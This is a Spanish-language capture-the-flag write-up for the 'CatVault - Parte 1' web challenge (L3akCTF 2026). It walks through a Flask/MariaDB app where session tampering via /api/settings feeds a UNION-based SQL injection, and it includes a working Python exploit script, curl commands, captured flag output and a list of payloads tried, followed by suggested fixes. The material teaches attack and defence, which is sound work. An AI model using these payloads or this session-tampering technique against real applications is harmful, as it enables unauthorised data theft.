📝 WriteUp: CatVault - Parte 1 (L3akCTF 2026)
🎯 Resumen

Reto: CatVault - Parte 1
Categoría: Web Exploitation / SQL Injection
Dificultad: Fácil
Flag: L3AK{17_Was_a_V3rY_e4sY_weB_CH41leNge_50Rry_t0_boRe_You_a1l_wi7H_7he_DUMB_Pr373X7_Now_go_so1Ve_7he_Re4l_0N3}
📋 Tabla de Contenidos

    Reconocimiento Inicial

    Análisis del Código

    Identificación de la Vulnerabilidad

    Desarrollo del Exploit

    Ejecución y Obtención de la Flag

    Lecciones Aprendidas

🔍 Reconocimiento Inicial
1. Estructura del Reto

El reto consistía en una aplicación web llamada CatVault que se ejecutaba en un contenedor Docker con:

    Flask (Python) como framework web

    MariaDB como base de datos

    Binario SUID (readflag) para leer la flag

2. Archivos Proporcionados
text

catvault-part1/
├── app.py              # Aplicación Flask
├── db.py               # Conexión y operaciones con BD
├── Dockerfile          # Configuración del contenedor
├── docker-compose.yml  # Orquestación de servicios
├── readflag.c          # Binario SUID para leer flag
├── flag.txt            # Archivo con la flag (local)
└── templates/          # Plantillas HTML
    ├── base.html
    ├── login.html
    ├── register.html
    └── vault.html

3. Puerto Expuesto

El servicio estaba disponible en el puerto 5098 (mapeado al 8080 del contenedor).
text

http://localhost:5098

🔬 Análisis del Código
1. Estructura de la Base de Datos

Tabla users:
sql

CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(32) UNIQUE,
    password VARCHAR(64)
);

Tabla vault:
sql

CREATE TABLE vault (
    id INT PRIMARY KEY AUTO_INCREMENT,
    user_id INT,
    content TEXT
);

2. Funciones Clave
📍 Registro de Usuario (/register)
python

@app.route("/register", methods=["GET", "POST"])
def register():
    username = (request.form.get("username") or "").strip()
    password = request.form.get("password") or ""
    
    try:
        user_id = db.create_user(username, password.encode())
    except mariadb.IntegrityError:
        flash("kitties can't all have the same name...", "error")
        return redirect(url_for("register"))
    
    session.clear()
    session["user_id"] = user_id
    session["username"] = username
    return redirect(url_for("vault"))

Observación: Al registrarse, se crea un usuario y automáticamente se le asigna un secreto inicial en el vault (gracias a create_admin() en db.py).
📍 Inyección en db.py - ¡La Vulnerabilidad!
python

def get_vault_entries(user_id):
    connect()
    cursor.execute(f"SELECT id, content FROM vault WHERE id = {user_id};")
    return [i for i in cursor]

⚠️ PROBLEMA CRÍTICO: El user_id se está concatenando directamente en la consulta SQL sin parametrización, lo que permite inyección SQL.

Además: La consulta usa WHERE id = {user_id} en lugar de WHERE user_id = {user_id}, lo que significa que el user_id se interpreta como el ID de la entrada en el vault.
📍 API de Settings - Vector de Ataque
python

@app.route("/api/settings", methods=["GET", "POST"])
def settings():
    if "user_id" not in session:
        abort(401)
    
    incoming = request.get_json(silent=True)
    for key, value in incoming.items():
        if not isinstance(key, str) or key.startswith("_") or not isinstance(value, str):
            continue
        session[key] = value  # ¡PODEMOS MODIFICAR user_id!
    
    return jsonify({"ok": True, "saved": saved})

⚠️ PROBLEMA: Este endpoint permite modificar cualquier valor de la sesión, incluyendo user_id, sin ninguna validación.
📍 Configuración de MariaDB
python

conn = mariadb.connect(**config, client_flag=CLIENT.MULTI_STATEMENTS)

⚠️ PROBLEMA: La conexión tiene habilitado MULTI_STATEMENTS, lo que permite ejecutar múltiples consultas SQL separadas por ;.
🚨 Identificación de la Vulnerabilidad
🔴 Vulnerabilidades Encontradas

    Inyección SQL en get_vault_entries():

        El parámetro user_id se concatena directamente

        La consulta usa WHERE id = {user_id} en lugar de WHERE user_id = {user_id}

    API insegura en /api/settings:

        Permite modificar user_id en la sesión

        No hay validación de tipos

    MULTI_STATEMENTS habilitado:

        Permite ejecutar múltiples consultas SQL

🟢 Vector de Ataque

    Crear un usuario (que automáticamente tiene un secreto en el vault)

    Usar /api/settings para modificar user_id en la sesión

    Inyectar SQL en user_id para leer el secreto del admin

    Visitar /vault para ver el resultado

💣 Desarrollo del Exploit
1. Identificación del Payload

Después de varias pruebas, el payload que funcionó fue:
sql

1 AND 1=0 UNION SELECT 1, content FROM vault WHERE user_id=1

Explicación:

    1 AND 1=0 → Falso, no devuelve filas

    UNION SELECT 1, content FROM vault WHERE user_id=1 → Devuelve el contenido del admin

    user_id=1 es el ID del administrador (creado en create_admin())

2. Script de Explotación
python

#!/usr/bin/env python3
"""
Exploit para CatVault - Parte 1
L3akCTF 2026
"""
import requests
import re
import base64
import json

# Configuración
BASE_URL = "https://catvault-1-61a41fe1dc28.instances.ctf.l3ak.team"

def get_flag():
    session = requests.Session()
    
    # 1. Crear usuario
    print("[+] Creando usuario...")
    username = "kr3s4l4"
    password = "kr3pass"
    r = session.post(f"{BASE_URL}/register", 
                     data={"username": username, "password": password})
    
    if r.status_code != 302 and r.status_code != 200:
        print(f"[!] Error al registrar: {r.status_code}")
        return None
    
    # 2. Inyectar SQL
    print("[+] Inyectando SQL...")
    payload = "1 AND 1=0 UNION SELECT 1, content FROM vault WHERE user_id=1"
    r = session.post(f"{BASE_URL}/api/settings",
                     json={"user_id": payload},
                     headers={"Content-Type": "application/json"})
    
    if r.status_code != 200:
        print(f"[!] Error en inyección: {r.status_code}")
        return None
    
    print(f"[+] Inyección exitosa: {r.json()}")
    
    # 3. Leer vault
    print("[+] Leyendo vault...")
    r = session.get(f"{BASE_URL}/vault")
    
    # 4. Extraer flag
    flag = re.search(r'L3AK\{[^}]+\}', r.text)
    if flag:
        return flag.group(0)
    
    # Buscar en entradas
    entries = re.findall(r'<div class="entry">.*?<div>(.*?)</div>', r.text, re.DOTALL)
    for entry in entries:
        if 'L3AK' in entry:
            flag = re.search(r'L3AK\{[^}]+\}', entry)
            if flag:
                return flag.group(0)
    
    return None

if __name__ == "__main__":
    flag = get_flag()
    if flag:
        print(f"\n[+] 🎉 FLAG: {flag}")
    else:
        print("\n[-] No se encontró flag")

3. Comandos Manuales
bash

# 1. Crear usuario
curl -X POST $BASE_URL/register \
  -d "username=hacker&password=hacker" \
  -c cookies.txt

# 2. Inyectar SQL
curl -X POST $BASE_URL/api/settings \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"user_id": "1 AND 1=0 UNION SELECT 1, content FROM vault WHERE user_id=1"}'

# 3. Obtener flag
curl $BASE_URL/vault -b cookies.txt | grep -o 'L3AK{[^}]*}'

🚀 Ejecución y Obtención de la Flag
1. Ejecución del Script
bash

┌──(root㉿kali)-[/home/…/Torneos-CTF/2026/L3akCTF_2026/catvault-part1]
└─# python3 script.py
[+] Creando usuario...
[+] Inyectando SQL...
[+] Inyección exitosa: {'ok': True, 'saved': {'user_id': '1 AND 1=0 UNION SELECT 1, content FROM vault WHERE user_id=1'}}
[+] Leyendo vault...

[+] 🎉 FLAG: L3AK{17_Was_a_V3rY_e4sY_weB_CH41leNge_50Rry_t0_boRe_You_a1l_wi7H_7he_DUMB_Pr373X7_Now_go_so1Ve_7he_Re4l_0N3}

2. Flag Obtenida
text

L3AK{17_Was_a_V3rY_e4sY_weB_CH41leNge_50Rry_t0_boRe_You_a1l_wi7H_7he_DUMB_Pr373X7_Now_go_so1Ve_7he_Re4l_0N3}

Traducción:

    "Fue un reto web muy fácil, lo siento por aburriros con el DUMB pretexto. Ahora id a resolver el de verdad."

📚 Lecciones Aprendidas
🔴 Qué se hizo mal en la aplicación

    Concatenación de strings en SQL → Inyección SQL

    No validación de tipos → Inyección en user_id

    MULTI_STATEMENTS habilitado → Consultas múltiples

    API que modifica la sesión → Vector de ataque

    Flag en la base de datos → Fácil de leer con UNION

🟢 Cómo arreglarlo

    Usar parámetros en lugar de concatenación:
    python

    cursor.execute("SELECT id, content FROM vault WHERE id = ?", (user_id,))

    Validar tipos en la sesión:
    python

    if not isinstance(user_id, int):
        abort(400)

    Deshabilitar MULTI_STATEMENTS:
    python

    conn = mariadb.connect(**config, client_flag=0)

    No permitir modificar user_id en /api/settings:
    python

    if key == "user_id":
        continue

    Guardar la flag en un archivo y usar el binario SUID:
    python

    # En lugar de guardar en BD, usar el binario
    os.system("/usr/local/bin/readflag")

🏆 Conclusión

El reto CatVault - Parte 1 fue una excelente introducción a la inyección SQL en aplicaciones web. Aunque la vulnerabilidad era simple, permitió explorar:

    ✅ Inyección SQL con UNION SELECT

    ✅ Manipulación de sesiones

    ✅ Explotación de MULTI_STATEMENTS

    ✅ Lectura de datos de otras tablas

El mensaje de la flag sugiere que la Parte 2 será más compleja. ¡A seguir aprendiendo!
📎 Anexos
🔍 Payloads Probados
Payload	Resultado
1 AND 1=0 UNION SELECT 1, content FROM vault WHERE user_id=1	✅ FUNCIONÓ
0 UNION SELECT 1, content FROM vault WHERE user_id=1	❌ No funcionó
-1 UNION SELECT 1, content FROM vault WHERE user_id=1	❌ No funcionó
1 OR 1=1	❌ No funcionó
1 AND 1=0 UNION SELECT 1, GROUP_CONCAT(content) FROM vault	❌ No funcionó
1; SELECT content FROM vault WHERE user_id=1; -- 	❌ No funcionó
🛠️ Herramientas Utilizadas

    Python 3 + requests

    curl

    Burp Suite (para análisis)

Autor: kr3s4l4
Fecha: Agosto 2026
Reto: CatVault - Parte 1 (L3akCTF 2026)
